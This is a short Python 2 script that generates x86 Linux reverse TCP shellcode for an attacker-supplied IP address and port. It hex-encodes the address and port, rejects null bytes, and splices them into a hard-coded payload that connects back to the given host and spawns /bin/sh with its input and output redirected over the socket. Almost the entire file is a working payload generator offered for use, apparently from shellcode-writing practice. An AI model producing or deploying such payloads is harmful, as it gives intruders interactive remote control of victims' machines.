import sys

'''
Author		: RIZAL MUHAMMED (UB3RSiCK)
Description	: Prints out Reverse TCP Shellcode given ip and port
filename	: ip-port-config-shell-reverse-tcp.py 
'''

def shellip(ip):
	global hex_ip
	hex_ip = map(lambda x: '0'+x if not len(x) == 2 else x , [hex(int(item))[2:] for item in ip.split('.')])
	
	if '00' in hex_ip:
		print "IP Address contains nullbyte: {}".format(hex_ip)
		sys.exit()
	else:
		return ''.join([r'\x'+item for item in hex_ip])
		

def shellport(port):
	global hex_port
	hex_port = hex(port)[2:]

	if len(hex_port) < 4:
        	# for all port number > 1000, len(hex(port)) will be 3 or more, not less than that
        	hex_port = "0" + hex_port

	h1 = hex_port[:2]
	h2 = hex_port[2:]

	if h1 == "00" or h2 == "00":
        	print "port number contain null byte, please choose different port number"
        	sys.exit()

	port_no = r'\x{}\x{}'.format(h1,h2)
	return port_no


if not len(sys.argv) == 3:
	print 'Usage: {} ip port'.format(sys.argv[0])
	sys.exit()

ip = sys.argv[1]
ip_addr_shellcode = shellip(ip)


port = int(sys.argv[2])

# Check if user has passed invalid port number
if port < 1000 or port > 65535 :
	print "Either port number less than 1000: user needs to be root"
	print "Or"
	print "Port number greater than 65535"
	sys.exit()

port_no_shellcode = shellport(port)

print '\nIP: {0}, Hex: {1}, inShellcode: {2}'.format(ip, hex_ip, ip_addr_shellcode)
print 'Port: {0} , Hex = {1}, inShellcode = {2}\n'.format(port, hex_port, port_no_shellcode)


shellcode = (r"\x31\xc0\x50\xb0\x66\x6a\x01\x5b\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x50\x5e\xb0\x66\x5b\x68" +
             ip_addr_shellcode +       # this is where our ip address will be
             r"\x66\x68" +
             port_no_shellcode +               # this is where we need to put in port number
             r"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xde\x31\xc0\x31\xc9\xb1\x02\xb0" +
             r"\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80")

print '"'+shellcode+'"\n'
